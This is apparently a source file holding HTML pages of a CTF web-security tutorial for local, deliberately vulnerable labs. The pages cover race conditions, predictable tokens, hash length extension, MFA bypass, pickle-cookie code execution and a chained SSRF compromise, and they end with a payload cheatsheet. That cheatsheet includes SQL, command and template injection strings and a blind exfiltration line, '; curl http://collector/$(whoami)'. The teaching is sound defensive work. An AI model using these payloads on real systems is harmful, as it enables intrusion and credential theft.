<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/30-request-smuggling-clte">Lab 30: Request smuggling</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/31-crlf-header-injection">Lab 31: CRLF injection</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/32-host-header-reset">Lab 32: Host-header reset poisoning</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/33-cache-poisoning">Lab 33: Cache poisoning</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/34-websocket-injection">Lab 34: WebSocket injection</a></li>
</ul>""",
}


LOGIC = {
    "section": "guides", "slug": "logic-time-and-crypto", "published": "2026-09-15",
    "eyebrow": "Tutorial 09 / Logic", "time": "8 min",
    "tags": "Races &middot; Predictable tokens &middot; MFA &middot; Labs 35&ndash;40",
    "title": "Business Logic, Time, and Crypto | h5i web security tutorial",
    "h1": "Business Logic, Time, and Crypto",
    "description": "A beginner-friendly CTF tutorial: race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution.",
    "meta": "Race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution.",
    "deck": "A beginner-friendly CTF tutorial: race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution.",
    "next": ("/guides/exploit-chains/", "Next in the series", "Building Exploit Chains", "Carry fresh values between requests, turn small findings into a complete compromise, and keep the whole chain reproducible."),
    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
    "body": r"""<p>Many serious vulnerabilities contain no obviously dangerous character. Every request may be well-formed and every field may pass validation, while the application’s larger rule is still wrong.</p>
<p>Labs 35–40 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> focus on those rules: ordering, concurrency, randomness, cryptographic constructions, authentication state, and serialization.</p>
<p>The labs are local and deliberately vulnerable. Race tests and business-logic attacks can modify data, so use them only with explicit authorization.</p>
<h2 id="lab-35-race-a-check-then-act-operation">Lab 35: race a check-then-act operation</h2>
<p>Alice has 100 credits. The transfer endpoint reads the balance, waits briefly, and subtracts later. Multiple requests can therefore observe the same original balance before any one updates it.</p>
<pre><code class="language-bash">$ ./run.sh 35
$ h5i browser open 'http://127.0.0.1:9350/' \
  --session lab35 --new --capture
</code></pre>
<p>The homepage prints Alice’s bearer token. Read it out of the captured response:</p>
<pre><code class="language-bash">$ h5i websec show res_0 --session lab35 --raw
</code></pre>
<p>Copy the <code>tok_...</code> value, then release 25 transfers together:</p>
<pre><code class="language-bash">$ TOKEN='PASTE_TOKEN'
$ h5i websec replay req_0 --session lab35 --create \
  --repeat 25 --race \
  --set method=POST --set path=/api/transfer \
  --set header.Content-Type=application/json \
  --set &quot;header.Authorization=Bearer $TOKEN&quot; \
  --set json.to=vault --set json.amount=100
</code></pre>
<p><code>--repeat 25</code> creates the requests. <code>--race</code> makes their worker threads wait at a barrier and then send together.</p>
<p>Several transfers pass the balance check using the same 100-credit snapshot. Request <code>/api/rewards</code> to obtain <code>FLAG{race_double_spend}</code>.</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab35 --create \
  --set path=/api/rewards
</code></pre>
<p>The fix is an atomic database operation or transaction that locks the row, checks the balance, and updates it as one indivisible action. An idempotency key can also prevent the same logical operation from being accepted repeatedly.</p>
<h2 id="lab-36-stack-individually-valid-coupons">Lab 36: stack individually valid coupons</h2>
<p>The checkout API carefully validates every item and coupon. It forgets one business rule: the same coupon should apply only once.</p>
<pre><code class="language-bash">$ ./run.sh 36
$ h5i browser open 'http://127.0.0.1:9360/' \
  --session lab36 --new --capture

$ h5i websec replay req_0 --session lab36 --create \
  --set method=POST --set path=/api/checkout \
  --set header.Content-Type=application/json \
  --set json.item=enterprise-license \
  --set 'json.coupons=[&quot;FRIEND25&quot;,&quot;FRIEND25&quot;,&quot;FRIEND25&quot;,&quot;FRIEND25&quot;]'
</code></pre>
<p>Four valid 25% discounts reduce the price to zero and return <code>FLAG{coupon_stacking}</code>.</p>
<p>This is not an input-validation bug. The JSON is valid and every coupon exists. The missing invariant is “a coupon may appear at most once.”</p>
<p>When testing business logic, write the product rules in plain language and try sequences that violate each rule: duplicates, reordering, reuse after cancellation, negative quantities, and concurrent redemption.</p>
<h2 id="lab-37-predict-a-recovery-token">Lab 37: predict a recovery token</h2>
<p>Security tokens must be generated with a cryptographically secure random number generator. This lab uses Python’s Mersenne Twister seeded with the current Unix second.</p>
<pre><code class="language-bash">$ ./run.sh 37
$ h5i browser open 'http://127.0.0.1:9370/' \
  --session lab37 --new --capture
</code></pre>
<p>Request a token for an address you control. The lab reveals it:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab37 --create \
  --set method=POST --set path=/api/recover \
  --set header.Content-Type=application/json \
  --set json.email=me@example.test
</code></pre>
<p>The reply contains <code>{"email": "me@example.test", "token": "..."}</code>. Put that token in a variable and search for the second that produced it. Do this immediately: the window is only a few seconds wide.</p>
<pre><code class="language-bash">$ MINE='PASTE_YOUR_TOKEN'
$ OFFSET=$(MINE=&quot;$MINE&quot; python3 - &lt;&lt;'SEED'
import os
import random
import time

observed = os.environ[&quot;MINE&quot;]
now = int(time.time())

for seed in range(now - 5, now + 6):
    r = random.Random(seed)
    candidate = &quot;%08x%08x&quot; % (r.getrandbits(32), r.getrandbits(32))
    if candidate == observed:
        print(seed - now)
        break
else:
    print(&quot;nocal&quot;)
SEED
)

$ printf '%s\n' &quot;$OFFSET&quot;
0
</code></pre>
<p><code>OFFSET</code> is the difference between the server’s clock and ours. <code>nocal</code> means too much time passed between the two commands, so request a fresh token and try again.</p>
<p>Now ask for the admin’s token, which we are not shown, and test the handful of values it could have been:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab37 --create \
  --set method=POST --set path=/api/recover \
  --set header.Content-Type=application/json \
  --set json.email=admin@acme.test

$ for T in $(OFFSET=&quot;$OFFSET&quot; python3 - &lt;&lt;'SEED'
import os
import random
import time

base = int(time.time()) + int(os.environ[&quot;OFFSET&quot;])

for seed in range(base - 2, base + 3):
    r = random.Random(seed)
    print(&quot;%08x%08x&quot; % (r.getrandbits(32), r.getrandbits(32)))
SEED
); do
    h5i websec replay req_0 --session lab37 --create --reset-budget \
      --set path=/api/recover/use --set &quot;query.token=$T&quot;
  done
</code></pre>
<p>Four of the five candidates answer <code>{"error": "unknown token"}</code>. The fifth returns <code>FLAG{predictable_token}</code>.</p>
<p>The issue is not token length. Sixteen hexadecimal characters look substantial, but all possible outputs collapse to a few likely time seeds. Use a CSPRNG such as Python’s <code>secrets.token_urlsafe</code>, expire tokens quickly, bind them to one account and purpose, and invalidate them after use.</p>
<h2 id="lab-38-hash-length-extension">Lab 38: hash length extension</h2>
<p>The signer authenticates data using:</p>
<pre><code class="language-text">SHA256(secret || data)
</code></pre>
<p>The secret is random and unknown. However, SHA-256’s Merkle–Damgård construction lets someone holding the digest resume hashing after the internal padding and append more data.</p>
<p>Start the lab:</p>
<pre><code class="language-bash">$ ./run.sh 38
$ h5i browser open 'http://127.0.0.1:9380/' \
  --session lab38 --new --capture
</code></pre>
<p>The homepage prints a sample signed request. Read it and copy the 64-character <code>sig</code>:</p>
<pre><code class="language-bash">$ h5i websec show res_0 --session lab38 --raw
</code></pre>
<p>The repository includes <code>extend.py</code>, which performs the SHA-256 state continuation:</p>
<pre><code class="language-bash">$ SIG='PASTE_SIGNATURE'
$ read -r NEWDATA NEWSIG &lt;&lt;&lt;&quot;$(python3 labs/38-length-extension/extend.py \
    --digest &quot;$SIG&quot; \
    --data 'user=guest&amp;role=viewer' \
    --append '&amp;role=admin' \
    --key-len 16)&quot;
</code></pre>
<p>It prints forged percent-encoded data and a new signature. The data contains padding bytes, so send the request target without URL normalization:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab38 \
  --raw-target &quot;/api/act?data=$NEWDATA&amp;sig=$NEWSIG&quot;
</code></pre>
<p>The application uses the last <code>role</code> value and returns <code>FLAG{length_extension}</code>.</p>
<p>Use HMAC rather than inventing a MAC from <code>hash(secret || message)</code>. HMAC’s construction is specifically designed to avoid length-extension attacks. Also reject duplicate security-critical parameters.</p>
<h2 id="lab-39-skip-the-second-authentication-state">Lab 39: skip the second authentication state</h2>
<p>MFA is a flow, not merely a screen. After password verification, this lab issues a temporary token intended only for the second step. Other endpoints mistakenly accept it as a full session.</p>
<pre><code class="language-bash">$ ./run.sh 39
$ h5i browser open 'http://127.0.0.1:9390/' \
  --session lab39 --new --capture
</code></pre>
<p>Log in with the known password:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab39 --create \
  --set method=POST --set path=/api/login \
  --set header.Content-Type=application/json \
  --set json.user=dana \
  --set json.password=correct-horse
</code></pre>
<p>Copy the returned token and call the vault without completing MFA:</p>
<pre><code class="language-bash">$ TOKEN='PASTE_LOGIN_TOKEN'
$ h5i websec replay req_0 --session lab39 --create \
  --set path=/api/vault \
  --set &quot;header.Authorization=Bearer $TOKEN&quot;
</code></pre>
<p>The response contains <code>FLAG{mfa_bypass}</code>.</p>
<p>Represent authentication level explicitly. A pre-MFA token should have a narrow audience and should be accepted only by the verification endpoint. After the second factor succeeds, issue a distinct full-session token.</p>
<h2 id="lab-40-a-signed-pickle-is-still-a-program">Lab 40: a signed pickle is still a program</h2>
<p>The final lab stores preferences in a Python pickle inside a cookie. The cookie has a valid HMAC, but the signing key is the sample value printed on the homepage.</p>
<pre><code class="language-bash">$ ./run.sh 40
$ h5i browser open 'http://127.0.0.1:9400/' \
  --session lab40 --new --capture
</code></pre>
<p>Python pickle is not a passive data format. Its reconstruction instructions can call functions. Create an object that runs <code>printenv FLAG</code>, then sign it with the exposed key:</p>
<pre><code class="language-bash">$ COOKIE=$(python3 - &lt;&lt;'PY'
import base64
import hashlib
import hmac
import pickle
import subprocess

SECRET = b&quot;prefs-signing-key&quot;

class Payload:
    def __reduce__(self):
        return (
            subprocess.check_output,
            ([&quot;printenv&quot;, &quot;FLAG&quot;],),
        )

raw = pickle.dumps(Payload())
mac = hmac.new(SECRET, raw, hashlib.sha256).hexdigest()[:16]
value = base64.urlsafe_b64encode(raw).decode().rstrip(&quot;=&quot;)
print(value + &quot;.&quot; + mac)
PY
)
</code></pre>
<p>Send it:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab40 --create \
  --set path=/api/prefs \
  --set &quot;cookie.prefs=$COOKIE&quot;
</code></pre>
<p>Deserialization executes the payload and returns <code>FLAG{pickle_cookie_rce}</code>.</p>
<p>The signature answers only “Was this value created by someone holding the key?” Once the key is exposed, it authorizes arbitrary pickle programs. Never deserialize untrusted pickle data. Use a non-executable format such as JSON with a strict schema, even when the value is signed.</p>
<h2 id="a-reusable-logic-testing-method">A reusable logic-testing method</h2>
<p>Move beyond individual fields:</p>
<ol>
<li>Write down invariants such as “balance never goes below zero” or “MFA is complete before this token reaches the vault.”</li>
<li>Test duplicates, reordering, retries, cancellation, and concurrent execution.</li>
<li>Distinguish apparent entropy from unpredictable entropy.</li>
<li>Review cryptographic constructions, not only algorithms.</li>
<li>Ask what a serialized format can execute when decoded.</li>
<li>Confirm the final business impact.</li>
</ol>
<h2 id="summary">Summary</h2>
<p>These labs exploited missing rules across time and state: concurrent balance checks, duplicate coupons, time-seeded tokens, an unsafe MAC construction, a pre-MFA token accepted too broadly, and executable serialized data.</p>
<pre><code class="language-bash">$ for s in lab35 lab36 lab37 lab38 lab39 lab40; do
    h5i browser close --session &quot;$s&quot;
  done
$ ./run.sh stop
</code></pre>
<p>In <a href="/guides/exploit-chains/">Building Exploit Chains</a>, we will combine earlier techniques into reproducible multi-step exploit chains.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/35-race-double-spend">Lab 35: Race condition</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/36-coupon-stacking">Lab 36: Coupon stacking</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/37-predictable-token">Lab 37: Predictable token</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/38-length-extension">Lab 38: Hash length extension</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/39-mfa-bypass">Lab 39: MFA bypass</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/40-pickle-cookie-rce">Lab 40: Insecure deserialization</a></li>
</ul>""",
}


CHAINS = {
    "section": "guides", "slug": "exploit-chains", "published": "2026-09-15",
    "eyebrow": "Tutorial 10 / Chaining", "time": "7 min",
    "tags": "Sequences &middot; Chaining &middot; Labs 41&ndash;42",
    "title": "Building Exploit Chains | h5i web security tutorial",
    "h1": "Building Exploit Chains",
    "description": "The final h5i tutorial: carry fresh values between requests, turn small findings into a complete compromise, and keep the entire chain reproducible.",
    "meta": "Carry fresh values between requests, turn small findings into a complete compromise, and keep the whole chain reproducible.",
    "deck": "The final h5i tutorial: carry fresh values between requests, turn small findings into a complete compromise, and keep the entire chain reproducible.",
    "next": ("/guides/cheatsheet/", "Keep it beside you", "Cheatsheet", "The loop, every --set target, the replay flags, and probe values by class, on one page."),
    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
    "body": r"""<p>The previous articles treated vulnerabilities one at a time. Real impact often appears only when several ordinary weaknesses connect.</p>
<p>Labs 41 and 42 conclude <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> with two kinds of chain:</p>
<ul>
<li>an automated workflow where one response supplies a fresh token to the next request; and</li>
<li>a five-stage exploit where every finding reveals the capability needed for the following step.</li>
</ul>
<p>The governing question is:</p>
<blockquote>
<p>What does this result let me reach that I could not reach before?</p>
</blockquote>
<p>These are deliberately vulnerable local labs. Only test systems where you have explicit authorization.</p>
<h2 id="why-a-single-replay-is-sometimes-insufficient">Why a single replay is sometimes insufficient</h2>
<p><code>h5i websec replay</code> is ideal when a stored request needs one controlled change. Some endpoints, however, require a value generated moments earlier:</p>
<ol>
<li>log in;</li>
<li>render a form;</li>
<li>extract its fresh CSRF token;</li>
<li>submit the form with that token; and</li>
<li>request the result.</li>
</ol>
<p>Copying values manually works once, but it is fragile and hard to reproduce. <code>h5i websec sequence</code> describes the steps, extracts values, and binds them into later requests.</p>
<h2 id="lab-41-mass-assignment-behind-a-valid-csrf-token">Lab 41: mass assignment behind a valid CSRF token</h2>
<p>Start the settings lab:</p>
<pre><code class="language-bash">$ ./run.sh 41
$ h5i browser open 'http://127.0.0.1:9410/' \
  --session lab41 --new --capture
</code></pre>
<p>The settings form uses a fresh, single-use CSRF token. The protection works. The bug is that the update handler still accepts a <code>role</code> field that the form never displays.</p>
<p>A replay of an old submission will fail because its token is missing or expired. Create <code>flow.json</code>:</p>
<pre><code class="language-json">{
  &quot;steps&quot;: [
    {
      &quot;name&quot;: &quot;log in&quot;,
      &quot;resend&quot;: 0,
      &quot;create&quot;: true,
      &quot;set&quot;: [
        &quot;method=POST&quot;,
        &quot;path=/api/login&quot;,
        &quot;header.Content-Type=application/json&quot;,
        &quot;json.user=${user}&quot;,
        &quot;json.password=${password}&quot;
      ]
    },
    {
      &quot;name&quot;: &quot;render the form and take its token&quot;,
      &quot;resend&quot;: 0,
      &quot;create&quot;: true,
      &quot;set&quot;: [
        &quot;method=GET&quot;,
        &quot;path=/account/settings&quot;
      ],
      &quot;extract&quot;: {
        &quot;csrf&quot;: &quot;regex:name=\&quot;csrf\&quot; value=\&quot;([^\&quot;]+)\&quot;&quot;
      }
    },
    {
      &quot;name&quot;: &quot;save an extra field&quot;,
      &quot;resend&quot;: 0,
      &quot;create&quot;: true,
      &quot;set&quot;: [
        &quot;method=POST&quot;,
        &quot;path=/account/settings&quot;,
        &quot;header.Content-Type=application/x-www-form-urlencoded&quot;,
        &quot;form.display_name=Guest&quot;,
        &quot;form.csrf=${csrf}&quot;,
        &quot;form.role=admin&quot;
      ]
    },
    {
      &quot;name&quot;: &quot;collect&quot;,
      &quot;resend&quot;: 0,
      &quot;create&quot;: true,
      &quot;set&quot;: [
        &quot;method=GET&quot;,
        &quot;path=/admin/flag&quot;
      ],
      &quot;extract&quot;: {
        &quot;flag&quot;: &quot;regex:(FLAG\\{[^}]+\\})&quot;
      }
    }
  ]
}
</code></pre>
<p>Run it with the lab credentials:</p>
<pre><code class="language-bash">$ h5i websec sequence flow.json \
  --session lab41 \
  --var user=guest \
  --var password=guest
</code></pre>
<p>The second step extracts <code>csrf</code>. <code>${csrf}</code> in the third step is substituted with that exact value. An unbound variable stops the sequence rather than silently becoming an empty string.</p>
<p>The final step binds:</p>
<pre><code class="language-text">FLAG{sequence_csrf_chain}
</code></pre>
<p>The sequence does not bypass CSRF. It satisfies the control correctly and then tests a different property: whether the authenticated user may assign <code>role</code>.</p>
<p>The fix is the same as in <a href="/guides/broken-access-control/">Broken Access Control</a>: allowlist editable fields and keep authorization data outside the object bound from the request.</p>
<h2 id="sequence-files-as-security-artifacts">Sequence files as security artifacts</h2>
<p>A useful proof of concept should do more than work on its author’s machine. A sequence records:</p>
<ul>
<li>which request each step resends;</li>
<li>which fields change;</li>
<li>which values are extracted;</li>
<li>where those values are used; and</li>
<li>where the final evidence appears.</li>
</ul>
<p>That makes it suitable for retesting and CI. After a fix, the same sequence should fail at the intended step.</p>
<p>Useful extractors include regular expressions, JSON paths, response headers, and status codes. Cookies need no manual binding because the browser session’s cookie jar carries them between steps.</p>
<h2 id="lab-42-the-final-gauntlet">Lab 42: the final gauntlet</h2>
<p>Lab 42 contains no new vulnerability class. It tests whether we can connect the techniques already learned.</p>
<pre><code class="language-bash">$ ./run.sh 42
$ h5i browser open 'http://127.0.0.1:9420/robots.txt' \
  --session lab42 --new --capture
$ h5i websec sitemap --session lab42 --human
</code></pre>
<p>Keep every probe inside this session. The request history will become the reproduction.</p>
<h3 id="step-1-recon-reveals-the-map">Step 1: recon reveals the map</h3>
<p><code>robots.txt</code> names <code>/internal/</code>. Request its handover note:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab42 \
  --set path=/internal/handover.md
</code></pre>
<p>The note reveals four facts:</p>
<ul>
<li>an older signup implementation still exists;</li>
<li>it is selected through <code>X-Api-Version: 0</code>;</li>
<li>a <code>support</code> account can use <code>/api/support/fetch</code>;</li>
<li>an internal ops service runs on port 9421 and still exposes <code>/debug/env</code>.</li>
</ul>
<p>The note is not the final vulnerability. It tells us where the chain can go.</p>
<h3 id="step-2-deprecated-behavior-enables-mass-assignment">Step 2: deprecated behavior enables mass assignment</h3>
<p>The visible route is <code>/api/v1/signup</code>, but a client-controlled header selects the older behavior. Ask it to create a support user:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab42 --create \
  --set method=POST \
  --set path=/api/v1/signup \
  --set header.Content-Type=application/json \
  --set header.X-Api-Version=0 \
  --set json.user=climber \
  --set json.role=support
</code></pre>
<p>The deprecated handler accepts <code>role</code> and returns a token. Copy it:</p>
<pre><code class="language-bash">$ TOKEN='PASTE_SUPPORT_TOKEN'
</code></pre>
<p>We combined the recon lesson from Lab 5 with mass assignment from Lab 9. Version skew does not always appear in the URL; it may be controlled through a header, media type, or query parameter.</p>
<h3 id="step-3-support-access-unlocks-ssrf">Step 3: support access unlocks SSRF</h3>
<p>The support token grants access to a URL fetcher. The application blocks familiar loopback spellings, but not the integer form <code>2130706433</code>:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab42 --create \
  --reset-budget \
  --set path=/api/support/fetch \
  --set &quot;header.Authorization=Bearer $TOKEN&quot; \
  --set query.url=http://2130706433:9421/debug/env
</code></pre>
<p>This is the SSRF filter bypass from Labs 25 and 26. The fetcher wraps what it received, so the ops service’s own JSON arrives as a string inside the <code>body</code> field:</p>
<pre><code class="language-json">{
  &quot;status&quot;: 200,
  &quot;body&quot;: &quot;{\&quot;NODE_ENV\&quot;: \&quot;production\&quot;, \&quot;OPS_TOKEN\&quot;: \&quot;ops_...\&quot;, \&quot;REGION\&quot;: \&quot;eu-west-1\&quot;}&quot;
}
</code></pre>
<p>Copy the <code>OPS_TOKEN</code> value:</p>
<pre><code class="language-bash">$ OPS='PASTE_OPS_TOKEN'
</code></pre>
<h3 id="step-4-use-the-internal-secret">Step 4: use the internal secret</h3>
<p>The final vault is reachable only through the internal service and requires the ops token:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab42 --create \
  --reset-budget \
  --set path=/api/support/fetch \
  --set &quot;header.Authorization=Bearer $TOKEN&quot; \
  --set &quot;query.url=http://2130706433:9421/vault?token=$OPS&quot;
</code></pre>
<p>The result contains:</p>
<pre><code class="language-text">FLAG{the_gauntlet}
</code></pre>
<p>The whole route was:</p>
<pre><code class="language-text">public robots.txt
  → internal handover note
  → deprecated signup behavior
  → support-role mass assignment
  → authenticated URL fetcher
  → SSRF filter bypass
  → internal debug environment
  → ops token
  → root credential
</code></pre>
<h2 id="why-the-chain-matters">Why the chain matters</h2>
<p>Consider the components separately:</p>
<ul>
<li>a public internal note may look informational;</li>
<li>deprecated signup behavior may appear low impact;</li>
<li>a support-only fetcher may seem appropriately restricted;</li>
<li>an internal debug endpoint may be considered unreachable.</li>
</ul>
<p>Together, an unauthenticated visitor obtains the root credential.</p>
<p>A report should state that end-to-end impact first, then explain each link. Individual severity scores describe components; the chain describes actual risk.</p>
<h2 id="fixing-a-chain">Fixing a chain</h2>
<p>Defense in depth means any correctly repaired boundary can stop the full path:</p>
<ul>
<li>do not publish internal operational notes;</li>
<li>delete deprecated handlers instead of merely hiding them;</li>
<li>allowlist signup fields across every version;</li>
<li>resolve and validate SSRF destinations against network policy;</li>
<li>prevent the application from reaching unnecessary internal ports;</li>
<li>remove production debug endpoints;</li>
<li>keep secrets out of debug output and query strings.</li>
</ul>
<p>The existence of several fixes is good news. It also means a partial fix should be retested with the same sequence to identify whether another route still completes the chain.</p>
<h2 id="the-method-to-keep">The method to keep</h2>
<p>Across all 42 labs, the recurring loop was:</p>
<ol>
<li><strong>Capture</strong> a legitimate request.</li>
<li><strong>Read</strong> the complete response and traffic record.</li>
<li><strong>Change one thing</strong> through replay.</li>
<li><strong>Compare</strong> status, size, time, headers, and body.</li>
<li><strong>Ask what the result unlocks.</strong></li>
<li><strong>Keep the next step in the same session.</strong></li>
<li><strong>Turn the final path into a reproducible sequence.</strong></li>
</ol>
<p>h5i supplies the browser, direct HTTP control, and audit trail. The security reasoning remains the tester’s job: understand the application’s actors, objects, trust boundaries, and invariants.</p>
<h2 id="summary">Summary</h2>
<p>Lab 41 automated a dynamic four-request flow without weakening its CSRF protection. Lab 42 chained recon, deprecated behavior, mass assignment, SSRF, and leaked internal credentials into a root compromise.</p>
<pre><code class="language-bash">$ h5i browser close --session lab41
$ h5i browser close --session lab42
$ ./run.sh stop
</code></pre>
<p>The complete exercises, vulnerable applications, proof-of-concept scripts, and detailed solutions are available in <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a>.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/41-sequence-csrf-chain">Lab 41: Sequence and CSRF chain</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/42-the-gauntlet">Lab 42: The Gauntlet</a></li>
<li><a href="https://github.com/h5i-dev/h5i-benchmark">h5i-benchmark</a></li>
</ul>""",
}


CHEATSHEET = {
    "section": "guides", "slug": "cheatsheet", "published": "2026-09-15",
    "eyebrow": "Reference / websec", "time": "5 min",
    "tags": "Cheatsheet &middot; websec &middot; Reference",
    "title": "h5i websec cheatsheet | h5i",
    "h1": "Cheatsheet",
    "description": "One page of h5i websec reference: the capture and replay loop, every --set target, the replay flags, probe values by vulnerability class, and how to read a sweep.",
    "meta": "One page of h5i websec reference: the capture and replay loop, every --set target, the replay flags, and probe values by class.",
    "deck": "One page. Print it, or keep it open beside the labs.",
    "faq": [
        ("How is a --set value parsed?", "The value is everything after the first =, so a payload full of = needs no escaping. A value that parses as JSON is sent as JSON, so json.admin=true is a boolean and json.admin=\"true\" is the string."),
        ("Which flag do loops forget?", "--reset-budget. Each page has a bounded network allowance, and without it a long loop stops partway while every later probe reads as a negative result."),
    ],
    "next": ("/guides/authorized-web-security-testing/", "Put it to work", "Run an authorized web security test with an AI agent", "Scope a session to a target you may test, then capture, enumerate, replay, and report."),
    "cta": ("The full command reference", "Every flag on this page, with its exit codes and limits.", "/manual/#h5i-websec", "Open the manual"),
    "body": r"""<div class="callout"><strong>The reference card for the h5i web security tutorial.</strong>
The labs it refers to are 42 deliberately vulnerable applications you run on your own machine,
in <a href="https://github.com/h5i-dev/h5i-tutorial">h5i-dev/h5i-tutorial</a>.
Use h5i only against systems you own or are explicitly authorized to test.</div>
<h2 id="the-loop">The loop</h2>
<pre><code class="language-bash">h5i browser open URL --session s --new --capture     # 1. capture
h5i websec requests --session s --human              # 2. read the record
h5i websec show res_0 --session s --raw              #    read one message
h5i websec replay req_0 --session s --set TARGET=V   # 3. change one thing
h5i websec diff res_0 res_1 --session s --human      # 4. compare
h5i websec match res_1 --session s --contains X      #    assert (exit 0/1/2)
h5i browser close --session s
</code></pre>
<p>Body of a replay's answer, in two calls:</p>
<pre><code class="language-bash">SEQ=$(h5i websec replay req_0 --session s --set … | jq -r .seq)
h5i websec show &quot;res_$SEQ&quot; --session s --raw
</code></pre>
<hr />
<h2 id="-set-targets"><code>--set</code> targets</h2>
<pre><code>method=POST                       url=http://other/x        path=/admin
query.&lt;name&gt;=                     header.&lt;name&gt;=            cookie.&lt;name&gt;=
json.&lt;a.b.0.c&gt;=                   form.&lt;name&gt;=              body.raw=
multipart.&lt;part&gt;=                 multipart.&lt;part&gt;.filename=
multipart.&lt;part&gt;.content-type=
</code></pre>
<ul>
<li>value = everything after the <strong>first</strong> <code>=</code></li>
<li>a value that parses as JSON is sent as JSON: <code>json.admin=true</code> (boolean),
  <code>json.p={"$gt":""}</code> (object), <code>json.t=["a"]</code> (array), <code>json.admin="true"</code> (string)</li>
<li><code>--create</code> to add, <code>--unset</code> to remove, <code>--set-file T=PATH</code> for bytes</li>
</ul>
<h2 id="replay-flags">Replay flags</h2>
<pre><code>--create           add a target that is not there
--set-file T=PATH  the value is the file's bytes (images, polyglots)
--as SESSION       send from another session's jar        [Lab 08]
--keep-credentials carry Cookie/Authorization with --as
--repeat N         N sends, with median + MAD timing      [Lab 14]
--race             release the repeats together           [Lab 35]
--no-follow        stop at the redirect and report it     [Lab 24]
--reset-budget     restart the page allowance — USE IN LOOPS [Lab 06]
--raw-target T     request-target byte for byte           [Lab 27]
--raw-request F    whole message byte for byte            [Lab 30]
</code></pre>
<h2 id="other-verbs">Other verbs</h2>
<pre><code>h5i websec requests --method/--status/--url-contains/--initiator/--denied-only/--limit
h5i websec show ID --raw | --body-to PATH
h5i websec sitemap
h5i websec match ID --status/--contains/--regex/--json-path/--header/--longer-than/--shorter-than
h5i websec sequence FILE --var N=V [--keep-going]         [Lab 41]
h5i websec socket ws://… --send FRAME --wait-ms MS        [Lab 34]
h5i browser requests            # includes what policy DENIED
h5i browser snapshot | markdown | click @e3 | type @e5 &quot;x&quot; | navigate URL
</code></pre>
<hr />
<h2 id="probe-values-by-class">Probe values, by class</h2>
<p><strong>Injection canaries</strong> (send once per parameter; watch status, size, time):</p>
<pre><code>'    &quot;    \    `    ;    |    &amp;    &lt;    &gt;    ${7*7}    {{7*7}}    ../    %00
</code></pre>
<p><strong>SQL</strong> — [Labs 12–14, 19]</p>
<pre><code>'                          break it
' AND '1'='1  /  '1'='2    prove the logic changed
' ORDER BY 3 --            count columns
' UNION SELECT 1,2,3 --    read
' AND (SELECT unicode(substr(x,1,1)) FROM t) &gt; 77 --      boolean oracle
' OR (SELECT CASE WHEN (…) THEN sleep(1) ELSE 0 END) --   timing oracle
schema: sqlite_master | information_schema.tables | pg_tables | sys.tables
comment: `-- ` (with the space) | # | /**/
</code></pre>
<p><strong>NoSQL / type confusion</strong> — [Labs 09, 15]</p>
<pre><code>{&quot;$gt&quot;: &quot;&quot;}   {&quot;$ne&quot;: null}   {&quot;$regex&quot;: &quot;^a&quot;}   {&quot;$in&quot;: [...]}
?p[$ne]=1      ?a[]=x&amp;a[]=y      true vs &quot;true&quot;      1 vs &quot;1&quot;
</code></pre>
<p><strong>Command</strong> — [Labs 16, 34]</p>
<pre><code>; id      | id      &amp;&amp; id      $(id)      `id`      %0a id
${IFS} for spaces      {cat,/etc/passwd}      c''at
close the quote first:  x'; id; echo '
blind: ; sleep 5;   |   ; curl http://collector/$(whoami);
</code></pre>
<p><strong>Template (SSTI)</strong> — [Labs 17, 29]</p>
<pre><code>{{7*7}}  {{7*'7'}}  ${7*7}  #{7*7}  &lt;%= 7*7 %&gt;
python: obj.__init__.__globals__[&quot;SECRET&quot;]
        ''.__class__.__mro__[1].__subclasses__()
jinja:  {{ cycler.__init__.__globals__.os.popen('id').read() }}  {{ config }}
</code></pre>
<p><strong>Traversal / LFI</strong> — [Labs 27, 29]</p>
<pre><code>../  ..%2f  %2e%2e%2f  %252e%252e%252f  ..%c0%af  ....//
